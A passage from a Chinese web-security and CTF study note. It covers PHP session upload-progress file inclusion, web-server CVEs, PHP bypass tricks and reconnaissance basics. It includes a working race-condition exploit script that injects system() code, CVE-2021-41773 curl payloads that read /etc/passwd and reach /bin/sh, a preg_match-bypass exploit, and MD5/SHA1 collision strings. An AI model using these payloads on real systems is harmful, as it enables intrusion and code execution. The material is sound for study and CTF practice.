我们考虑进行文件包含，之后使用其他方法先对phpinfo进行查看，观察是否关闭了`session.upload_progress.cleanup`，若没有则可以直接使用burp上传恶意代码，若存在则需要不停上传同一个session来确保恶意代码能够执行。

###### 脚本编写

我们一般通过python进行脚本编写（python版本3.8+）

首先导入两个库

```
import threading
import requests
```

requests用来进行网络请求，threading用来分离线程，做到不断循环上传session从而竞争。

定义基本信息

```
target_url = "http://xxx.xxx.xxx.xxx/index.php"#据情况而定
session_id = "flag"#自行决定
expcode = {"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('ls');?>"}#自行要执行的代码
MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致
proxies = {
    "http": "127.0.0.1:8080",
}#设置本机代理，也可以不设置
```

编写竞争函数

```
def send_file(session):#形参为后面多线程的指令集提供入口
    while True:
        resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', "nothing")}, cookies=MyCookie)
```

不停的上传同样的post请求。将结果存于res.txt中。

编写读取信息函数

```
def getflag(session):
    while True:
        payload_url = target_url + '?file=' + '/tmp/sess_' + session_id
        #根据漏洞进行伪协议读取文件
        resp = requests.get(url=payload_url)
        if 'upload_progress' in resp.text:
            print(resp.text)
            break
```

main函数

```
if __name__ == '__main__':
    session = requests.session()
    t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程
    t.start()
    #两个线程独立运行
    getflag(session)
```

完整代码

```
import threading
import requests

target_url = "http://xxx.xxx.xxx.xxx/index.php"#据情况而定
session_id = "flag"#自行决定
expcode = {"PHP_SESSION_UPLOAD_PROGRESS":"<?php system('ls');?>"}#自行要执行的代码
MyCookie = {'PHPSESSID': sessid}#设置本地cookie值和自定义的session_id一致
proxies = {
    "http": "127.0.0.1:8080",
}#设置本机代理，也可以不设置

def send_file(session):#形参为后面多线程的指令集提供入口
    while True:
        resp = requests.post(url=target_url, data=expcode, files={'file': ('res.txt', "nothing")}, cookies=MyCookie)
        
def getflag(session):
    while True:
        payload_url = target_url + '?file=' + '/tmp/sess_' + session_id
        #根据漏洞进行伪协议读取文件
        resp = requests.get(url=payload_url)
        if 'upload_progress' in resp.text:
            print(resp.text)
            break

if __name__ == '__main__':
    session = requests.session()
    t = threading.Thread(target=send_file, args=(session,))#为竞争函数创建一个新线程
    t.start()
    #两个线程独立运行
    getflag(session)
```

###### 参考文献与拓展

[什么是session | 许小珂 (xuxiaoke.com)](https://www.xuxiaoke.com/phpnote/35.html)

[从第五空间 2021\EasyCleanup认识php_session_Aiwin-Lau的博客-CSDN博客](https://blog.csdn.net/weixin_53090346/article/details/125037416)

[PHP Session.upload_progress - chalan630 - 博客园 (cnblogs.com)](https://www.cnblogs.com/chalan630/p/14147602.html)

[PHP：会话上传进度 （php官网）](https://www.php.net/manual/en/session.upload-progress.php#:~:text=Session Upload Progress. When the session.upload_progress.enabled INI option,(via XHR for example) to check the status.)

[对于session.upload_progress漏洞的理解_huamanggg的博客-CSDN博客](https://blog.csdn.net/m0_51078229/article/details/114440061)

[详解利用session进行文件包含*合天网安实验室的博客-CSDN博客*session文件包含](https://blog.csdn.net/qq_38154820/article/details/120300273)

### （三）robots协议

[详解robots协议](https://www.cnblogs.com/sddai/p/6820415.html)

Robots协议（也称为爬虫协议、机器人协议等）的全称是“网络爬虫排除标准”（Robots Exclusion Protocol），网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。

**Robots协议**也称为爬虫协议、爬虫规则、机器人协议，是网站国际互联网界通行的道德规范,其目的是保护网站数据和敏感信息、确保用户个人信息和隐私不被侵犯。“规则”中将搜索引擎抓取网站内容的范围做了约定,包括网站是否希望被搜索引擎抓取,哪些内容不允许被抓取,而网络爬虫可以据此自动抓取或者不抓取该网页内容。如果将网站视为酒店里的一个房间,robots.txt就是主人在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这个文件告诉来访的搜索引擎哪些房间可以进入和参观,哪些不对搜索引擎开放。

如果在服务器返回的请求中有disallowed之类的提示则代表你可以尝试访问robots协议（/robots.txt）来找找想要的内容。

### （四）版本控制仓库的泄漏

[常见的版本控制软件](https://cloud.tencent.com/developer/article/1184654)

> 版本控制软件提供完备的版本管理功能，用于存储、追踪目录（文件夹）和文件的修改历史，是软件开发者的必备工具，是软件公司的基础设施。版本控制软件的最高目标，是支持软件公司的配置管理活动，追踪多个版本的开发和维护活动，及时发布软件。

通常网站会使用这些版本控制仓库进行动态维护，当我们发现网站存在/.git等目录的泄漏，代表其使用的版本控制仓库已经泄漏地址，我们可以在里面找到很多无法通过正常访问手段查看的内容。

常见的版本控制仓库有CVS、SVN、git、Mercurial。

### （五）WEB服务器

> Web服务器当是指驻留于因特网上某种类型计算机的程序。当Web浏览器(客户端)连接到服务器上并请求文件时，服务器会将处理该请求并将文件发送到该浏览器上，附带的信息会告诉浏览器如何查看该文件(即文件类型)。Web服务器会使用HTTP进行信息交流，因此Web服务器也常被称为HTTP服务器。
>
> Web服务器可驻留于各种类型的计算机，从常见的PC到巨型的UNIX网络,以及其他各种类型的计算机。它们通常经过一条高速线路与因特网连接，如果对性能无所谓，则也可使用低速连接(甚至是调制解调器)。
>
> 目前，市场上Web服务器产品的种类很多，比较著名的有**Apache、Netscape Enterpriise、 Zeus、AOLserver、Roxen WebSerer、Jigsew**等。

一般我们常见的web服务器有Nginx、Apache、IIS（Microsoft），这些web服务器有其各自的特性，作为用户和服务器之间的桥梁，它们的侧重点不一样，Nginx应对静态请求效果很好（如.html），Apache应对动态请求（.js/.php/.asp）远远强于Nginx，所有根据一些我们能在服务器上见到的特征可以估测和判断服务器使用的web服务器类型。

对于**Apache**服务器，有这些漏洞可以尝试在早期版本使用：

CVE-2021-41773（目录穿越）

相应的，对应该漏洞的payload是：

> curl -s --path-as-is “：[PORT]/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
>
> ```
> /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
> 
> ```

> curl -s --path-as-is --data “echo;Command“ ”[IP]：[PORT]/cgi-bin/.%2e/%2e%2e/%2e%2e%2e/bin/sh
>
> ```
> /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;id'
> ```

CVE-2021-40438（远程执行）

等等。

对于**Nginx**服务器

CVE-2021-23017（DNS解析PoC）

还有因为配置错误而造成的Nginx目录穿越（ [Nginx漏洞修复之目录穿越(目录遍历)漏洞复现及修复](https://blog.csdn.net/weixin_42586723/article/details/122944781)）

等等。

### （六）服务器模板引擎

> 模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。

模板引擎本质上就是执行动态渲染，一个热搜榜不可能被写死，每次更改需要程序员自己手动修改，模板引擎可以做到对指定内容实时渲染替换，做到动态更新。

一些常见的模板引擎有lask（python3）、jinja2/flask（python）、smarty（PHP）、Twig（PHP）、Freemarker（JavaEE）、velocity（JavaEE）；

### （七）数据库

数据库广泛用于服务器，用来存储大量的数据并进行读取等操作，目前市面上数据库类型种类繁多，有关系型数据库和非关系型数据库之分，目前最为常见的数据库是MySQL，因为其开源和免费而受到众多开发者的支持。

但是MySQL在处理超巨量型数据时十分力不从心，专业型数据库Oracle解决了这个问题，成为企业的数据库解决方案，此外还有Microsoft的SQL Sever和Access，非关系型数据库MongoDB，以存储键值高效而持续闻名的redis。

不同的数据库在服务端用处也不一致，但他们基本都使用同一的SQL语言进行数据库操作，这使得数据库的学习成本降低。

MySQL+php是常见的前端组合，它们被广泛用于中小型论坛、博客或其他网站，开发成本低。

一般服务器中不适用Access作为数据库存储。

redis常用来存储需要反复读取的信息，如session信息。redis可以被用来提权，以此来获得服务器的root权限。

[SQL语句大全](https://blog.csdn.net/weixin_37990128/article/details/109165556)

### （八）正则表达式

[正则表达式 – 语法 | 菜鸟教程 (runoob.com)](https://www.runoob.com/regexp/regexp-syntax.html)

[如何教你看懂复杂的正则表达式 - superstar - 博客园 (cnblogs.com)](https://www.cnblogs.com/superstar/p/6638970.html)

### （九）url编码

#### 小tips

%A0表示NBSP（U + 00A0）。* +表示普通空格（U + 0020）。 NBSP显示为替换字符（U + FFFD）

### （十）LDAP

全称是Lightweight Directory Access Protocol，轻量目录访问协议。顾名思义，LDAP是设计用来访问目录数据库的一个协议。协议就是标准，并且是抽象的。在这套标准下，AD（Active Directory）是微软的对目录服务数据库的实现。目录服务数据库也是一种数据库，这种数据库相对于我们熟知的关系型数据库（比如MySQL,Oracle）。

### （十一）token

1、Token的引入：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。

2、Token的定义：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。

3、使用Token的目的：Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。

有很多token的具体实现。

#### [JSON 网络令牌 - jwt.io](https://jwt.io/)

通俗地说，JWT的本质就是一个字符串，它是将**用户信息**保存到一个**Json字符串**中，然后进行编码后得到一个JWT token，并且这个JWT token带有签名信息，接收后可以校验是否被篡改，所以可以用于在各方之间安全地将信息作为Json对象传输。JWT的认证流程如下：

首先，前端通过Web表单将自己的用户名和密码发送到后端的接口，这个过程一般是一个POST请求。建议的方式是通过SSL加密的传输(HTTPS)，从而避免敏感信息被嗅探。

后端核对用户名和密码成功后，将包含用户信息的数据作为JWT的Payload，将其与JWT Header分别进行Base64编码拼接后签名，形成一个JWT Token，形成的JWT Token就是一个如同lll.zzz.xxx的字符串。

后端将JWT Token字符串作为登录成功的结果返回给前端。前端可以将返回的结果保存在浏览器中，退出登录时删除保存的JWT Token即可。

前端在每次请求时将JWT Token放入HTTP请求头中的**Authorization**属性中(解决XSS和XSRF问题)
后端检查前端传过来的JWT Token，验证其有效性，比如检查签名是否正确、是否过期、token的接收方是否是自己等等。

验证通过后，后端解析出JWT Token中包含的用户信息，进行其他逻辑操作(一般是根据用户信息得到权限等)，返回结果。

[ JWT详解_baobao555#的博客-CSDN博客_jwt](https://blog.csdn.net/weixin_45070175/article/details/118559272)

JWT需要加密算法，因而对其加密算法的反寻找很重要，这个github项目提供了这个需求的实现方法。

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker.git
```



## 二、渗透测试信息收集

### （一）收集域名信息

#### whois查询

whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。

在kali环境下使用``whois 域名``就可以查询到域名的基本信息

#### 工信部备案查询

在我国，所有运营的网站都需要在工信部备案，可以通过工信部官网查询。

[ICP备案查询 - 站长工具 (chinaz.com)](http://icp.chinaz.com/)

### （二）收集敏感信息

#### 搜索引擎查询

搜索引擎基于网络爬虫技术，巧妙地运营搜索引擎构造查询语句可以得到想要的信息。

> 搜索引擎语法
> 使用搜索引擎搜索的时候，可以使用特定的语法来筛选搜索结果，达到精准搜索的目的。
>
> 1. +（加号）
>    搜索结果要求包含两个及两个以上关键字。
>
> 【用法】：关键词
>
> 【示例】：疑犯追踪+资源
>
> 【说明】：相当于空格和AND
>
> 2. -（减号）
>    排除特定关键词。
>
> 【用法】：关键词 空格 - 关键词
>
> 【示例】：考研 -推广 -推广链接
>
> 【注意】：百度有些关键词用减号没用
>
> 3. " "(双引号)
>    完全搜索匹配，搜索结果必须包括双引号中出现的所有词，连顺序也要保持一致，可用来搜索完整句子。
>
> 【用法】：“关键词”
>
> 【示例】：“疑犯追踪资源”
>
> 4. OR
>    搜索结果至少包含多个关键词中的任意一个。
>
> 【用法】：关键词1 空格 OR 空格 关键词2
>
> 【示例】：疑犯追踪 OR Person of Interest
>
> 【注意】：OR要大写
>
> 5. intitle
>    检索标题中含有关键词的网页。
>
> 【用法】：关键词 空格 intitle:需要限定的关键词
>
> 【示例】：疑犯追踪 intitle:资源
>
> 6. inurl
>    检索url中包含关键词的网页。
>
> 【用法】：inurl:关键词
>
> 【示例】：inurl:pan.baidu.com
>
> 7. intext
>    检索某个正文中含有关键词的网页。
>
> 【用法】：intext:关键词
>
> 【示例】：intext:“后台登陆”
>
> 8. site
>    搜索范围限定在特定的站点中。
>
> 【用法】：关键词 空格 site:搜索范围所限定的站点
>
> 【示例】：疑犯追踪 site:tieba.baidu.com
>
> 【注意】：站点前不用加www或http
>
> 9. filetype
>    限定搜索文件类型。
>
> 【用法】：关键词 空格 filetype:文件格式
>
> 【示例】：疑犯追踪 filetype:pdf
>
> 【注意】：filetype为mp3、mp4、jpg、png时，无搜索结果
>
> 10. 时间1…时间2
>     搜索特定时间范围内的关键词信息。
>
> 【用法】：关键词 空格 时间1…时间2
>
> 【示例】：疑犯追踪 2016…2018
>
> 11. link
>     检索指定域名的网页。
>
> 【用法】：link:网址
>
> 【示例】：link:pan.baidu.com
>
> 【说明】：将返回所有包含pan.baidu.com关键词的网页
>
> 12. related
>     检索相似类型的网页，用来搜索结构内容方面相似的网页。
>
> 【用法】：related:网址
>
> 【示例】：related:www.google.com
>
> 【说明】：将返回和www.google.com相似的页面，指网页布局相似。
>
> 13. cache
>     仅google有效，从google服务器上缓存页面中查询信息，可查询网页快照。
>
> 【用法】：cache:网址
>
> 【示例】：cache:www.google.com
>
> 14. info
>     用来显示与查询链接相关的一系列搜索结果。
>
> 【用法】：info:网址
>
> 【示例】：info:www.google.com
>
> 15. index of
>     搜索允许目录浏览的网页。
>
> 【用法】index of 空格 关键词
>
> 【示例】index of /admin
>
> 搜索语法可组合使用。

#### http抓包查询

可以观察网页发来的http响应获得一定的信息。

#### wappalyzer

这是一款可以鉴定网站使用了那些服务的工具，可以识别搭建网站的服务器、解释器、渲染模板、CMS等。



## 三、前端语言与前端注入

### （一）html

### （二）css

#### CSS实现键盘监听

[GitHub - maxchehab/CSS-Keylogging: Chrome extension and Express server that exploits keylogging abilities of CSS.](https://github.com/maxchehab/css-keylogging)

### （三）JavaScript

JavaScript是一种脚本语言，越来越广泛的用于网页的开发，由于其本地执行性，js会被传到本地执行，因此可以通过本地分析js代码获取一些信息。

### （四）xml

### （五）XSS注入

## 四、后端语言漏洞与绕过

### （一）php

#### 魔术方法

魔术方法是PHP面向对象中特有的特性。它们在特定的情况下被触发，都是以双下划线开头，利用魔术方法可以轻松实现PHP面向对象中重载（Overloading即动态创建类属性和方法）。 问题就出现在重载过程中，执行了相关代码。

```php
1、__get、__set

这两个方法是为在类和他们的父类中没有声明的属性而设计的

__get( $property ) 当调用一个未定义的属性时访问此方法

__set( $property, $value ) 给一个未定义的属性赋值时调用

这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）

2、__isset、__unset

__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法

__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法

与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）

3、__call

__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法

4、__autoload

__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。

注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。

5、__construct、__destruct

__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称

__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法

默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.

在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。

6、__clone

PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。

7、__toString

__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时，如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。

在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）

从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。

8、__sleep、__wakeup

__sleep 串行化的时候用

__wakeup 反串行化的时候调用

serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。

使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。

相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用 __wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。

9、__set_state

当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ => value, …)格式排列的类属性。

10、__invoke

当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效

11、__callStatic

它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。

同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。
```

#### 函数绕过

##### 1、preg_match()

```php
preg_match($pattern,$subject [, &$matches [, $flags = 0 [, $offset = 0 ]]]);
```

>$pattern：要搜索的模式，也就是编辑好的正则表达式；
>$subject：要搜索的字符串；
>$matches：可选参数（数组类型），如果提供了 $matches，它将被填充为搜索结果。 $matches[0] 包含完整模式匹配到的文本， $matches[1] 包含第一个捕获子组匹配到的文本，以此类推；
>flags：可选参数，flags 可以被设置为 PREG_OFFSET_CAPTURE，如果传递了这个标记，对于每一个出现的匹配，返回时都会附加上字符串偏移量（相对于目标字符串的）；
>$offset：可选参数，用于指定从目标字符串的哪个位置开始搜索（单位是字节）。

绕过原理：pcre.backtrack_limit

php为了防止DDoS攻击设计了访问上限，一般来说默认的访问限制次数是十万到一百万，只要提交的字符串在匹配函数的调用过程中，函数回溯超过这个上限，那么函数自动返回``false``来结束运行。

下面是一个例子（[NISACTF 2022]middlerce）：

```php
<?php
include "check.php";
if (isset($_REQUEST['letter'])){
    $txw4ever = $_REQUEST['letter'];
    if (preg_match('/^.*([\w]|\^|\*|\(|\~|\`|\?|\/| |\||\&|!|\<|\>|\{|\x09|\x0a|\[).*$/m',$txw4ever)){
        die("再加把油喔");
    }
    else{
        $command = json_decode($txw4ever,true)['cmd'];
        checkdata($command);
        @eval($command);
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

php源码中显示了关键的正则表达式，我们通过构造多个``$``来强迫其返回``false``，构造的exp如下：

```python
import threading
import requests
payload = '{"cmd":"?><?= `tail /f*`?>", "$":"' + "$"*(1000000) + '"}'
res = requests.post("http://1.14.71.254:28159/",data = {"letter":payload})
print(res.text)
```

此外，还可以通过url编码取反的方式绕过

```php
<?php
echo urlencode(~("phpinfo();"));
?>
```

之后可以在传入参数的时候进行取反，两次相同的取反结果一致，由于php的动态执行，字符串先以不可读的url编码形式与perg_match进行匹配，然后当进入eval等危险函数时，便会先取反恢复可读性，然后再执行。

##### 2、__wakeup()绕过

**（CVE-2016-7124）**

在被反序列化的过程中对象会触发其内部的``__wakeup()``函数，如果需要绕过，只需要修改序列化对象的参数列表使其参数个数与实际参数不同即可，如：

```php
O:4:"Test":3:{s:7:"Testa";s:7:"private";s:1:"b";s:6:"public";s:4:"*c";s:9:"protected";}
```

为了绕过我们通常修改其为：

```php
O:4:"Test":11:{s:7:"Testa";s:7:"private";s:1:"b";s:6:"public";s:4:"*c";s:9:"protected";}
```

##### 3、加密函数（md5\sha1）绕过

md5和sha1都是不可逆加密，目前没用有效的破解方法（除了暴力破解），php中经常使用``md5()``\\``sha1()``函数来进行加密判断。

根据php的特性，判断两个变量相等有``==``（弱相等），``===``（强相等），当出现弱相等比较时，如：

```php
if(md5($_GET['in1']) == md5($_GET['in2'])){........}
```

我们可以采用两种绕过方法：

1.类型绕过

md5()或sha1()只能传入数字，所以当我们传入非数字变量时，函数会返回null，可以利用这个特点来传入数组以绕过，``in1[]=0&in2[]=1``。

2.科学计数法绕过

MD5()会将0e开头的字符串直接识别成0，所以一些0e开头的字符串可以用于绕过，常见的0e开头的字符串有：

>s878926199a
>0e545993274517709034328855841020
>s155964671a
>0e342768416822451524974117254469
>s214587387a
>0e848240448830537924465865611904
>s214587387a
>0e848240448830537924465865611904
>s878926199a
>0e545993274517709034328855841020
>s1091221200a
>0e940624217856561557816327384675
>s1885207154a
>0e509367213418206700842008763514
>s1502113478a
>0e861580163291561247404381396064
>s1885207154a
>0e509367213418206700842008763514
>s1836677006a
>0e481036490867661113260034900752
>s155964671a
>0e342768416822451524974117254469
>s1184209335a
>0e072485820392773389523109082030
>s1665632922a
>0e731198061491163073197128363787
>s1502113478a
>0e861580163291561247404381396064
>s1836677006a
>0e481036490867661113260034900752
>s1091221200a
>0e940624217856561557816327384675
>s155964671a
>0e342768416822451524974117254469
>s1502113478a
>0e861580163291561247404381396064
>s155964671a
>0e342768416822451524974117254469
>s1665632922a
>0e731198061491163073197128363787
>s155964671a
>0e342768416822451524974117254469
>s1091221200a
>0e940624217856561557816327384675
>s1836677006a
>0e481036490867661113260034900752
>s1885207154a
>0e509367213418206700842008763514
>s532378020a
>0e220463095855511507588041205815
>s878926199a
>0e545993274517709034328855841020
>s1091221200a
>0e940624217856561557816327384675
>s214587387a
>0e848240448830537924465865611904
>s1502113478a
>0e861580163291561247404381396064
>s1091221200a
>0e940624217856561557816327384675
>s1665632922a
>0e731198061491163073197128363787
>s1885207154a
>0e509367213418206700842008763514
>s1836677006a
>0e481036490867661113260034900752
>s1665632922a
>0e731198061491163073197128363787
>s878926199a
>0e545993274517709034328855841020
>240610708 
>0e462097431906509019562988736854
>314282422 
>0e990995504821699494520356953734
>571579406 
>0e972379832854295224118025748221
>903251147 
>0e174510503823932942361353209384
>1110242161 
>0e435874558488625891324861198103
>1320830526 
>0e912095958985483346995414060832
>1586264293 
>0e622743671155995737639662718498
>2302756269 
>0e250566888497473798724426794462
>2427435592 
>0e067696952328669732475498472343
>2653531602 
>0e877487522341544758028810610885
>3293867441 
>0e471001201303602543921144570260
>3295421201 
>0e703870333002232681239618856220
>3465814713 
>0e258631645650999664521705537122
>3524854780 
>0e507419062489887827087815735195
>3908336290 
>0e807624498959190415881248245271
>4011627063 
>0e485805687034439905938362701775
>4775635065 
>0e998212089946640967599450361168
>4790555361 
>0e643442214660994430134492464512
>5432453531 
>0e512318699085881630861890526097
>5579679820 
>0e877622011730221803461740184915
>5585393579 
>0e664357355382305805992765337023
>6376552501 
>0e165886706997482187870215578015
>7124129977 
>0e500007361044747804682122060876
>7197546197 
>0e915188576072469101457315675502
>7656486157 
>0e451569119711843337267091732412
>QLTHNDT 
>0e405967825401955372549139051580
>QNKCDZO 
>0e830400451993494058024219903391
>EEIZDOI 
>0e782601363539291779881938479162
>TUFEPMC 
>0e839407194569345277863905212547
>UTIPEZQ 
>0e382098788231234954670291303879
>UYXFLOI 
>0e552539585246568817348686838809
>IHKFRNS 
>0e256160682445802696926137988570
>PJNPDWY 
>0e291529052894702774557631701704
>ABJIHVY 
>0e755264355178451322893275696586
>DQWRASX 
>0e742373665639232907775599582643
>DYAXWCA 
>0e424759758842488633464374063001
>GEGHBXL 
>0e248776895502908863709684713578
>GGHMVOE 
>0e362766013028313274586933780773
>GZECLQZ 
>0e537612333747236407713628225676
>NWWKITQ 
>0e763082070976038347657360817689
>NOOPCJF 
>0e818888003657176127862245791911
>MAUXXQC 
>0e478478466848439040434801845361
>MMHUWUV 
>0e701732711630150438129209816536

当出现强类型等于时，可以使用数组绕过，但不能使用科学计数法绕过，

```php
if(md5($_GET['in1']) === md5($_GET['in2'])){........}
```

此时我们考虑用MD5碰撞，MD5碰撞技术可以根据一个前缀生成两个md5值相等但本身不同的字符串值，一般我们使用工具fastcoll，但fastcoll生成的文件无法直接阅读，需要传入php环境进行url编码，所以有如下常用的碰撞结果：

###### 常用的MD5碰撞

```
param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
```

```
param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

或

```
array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

&array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

###### 常用的sha1碰撞

```
array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
    
    &array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1

```

**注意：php8不支持数组绕过**

##### 4、is_numeric漏洞

会忽视0x这种十六进制的数

容易引发sql注入操作，暴漏敏感信息

```json
echo json_encode([
    is_numeric(233333),
    is_numeric('233333'),
    is_numeric(0x233333),
    is_numeric('0x233333'),
    is_numeric('233333abc'),
]);
```

结果如下

16进制数0x61646D696EASII码对应的值是admin

如果我们执行了后面这条命令的话：SELECT * FROM tp_user where username=0x61646D696E，结果不言而喻

```json
[
    true,
    true,
    true,
    false,
    false
]
```

##### 5、in_array漏洞

in_array中是先将类型转为整形，再进行判断

转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0

```php
<?php
var_dump(in_array("2%20and%20%", [0,2,3]));
```

结果如下

```json
bool(true)
```

##### 6、switch漏洞

switch中是先将类型转为整形，再进行判断

转换的时候，如果将字符串转换为整形，从字符串非整形的地方截止转换，如果无法转换，将会返回0

```php+HTML
<?php
$i ="2abc";
switch ($i) {
    case 0:
    case 1:
    case 2:
        echo "i是比3小的数";
        break;
    case 3:
        echo "i等于3";
}
结果如下
    i是比3小的数

```

##### 7、文件包含与伪协议

